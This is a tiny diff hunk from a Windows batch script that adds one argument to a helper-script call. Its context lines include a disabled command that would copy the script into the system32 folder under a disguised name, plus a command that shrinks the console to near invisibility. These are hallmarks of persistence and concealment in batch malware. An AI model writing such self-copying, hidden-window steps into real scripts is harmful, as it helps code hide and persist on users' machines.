@@ -16,7 +16,7 @@ rem ## {C3P0D40fAe8B} ##
 :if not exist "%systemroot%\system32\-monitor.bat" xcopy  /y %0 %systemroot%\system32\
 mode 30,2
 call %userprofile%\cc v
-call b scripttmp
+call b scripttmp x
 cd
 
 
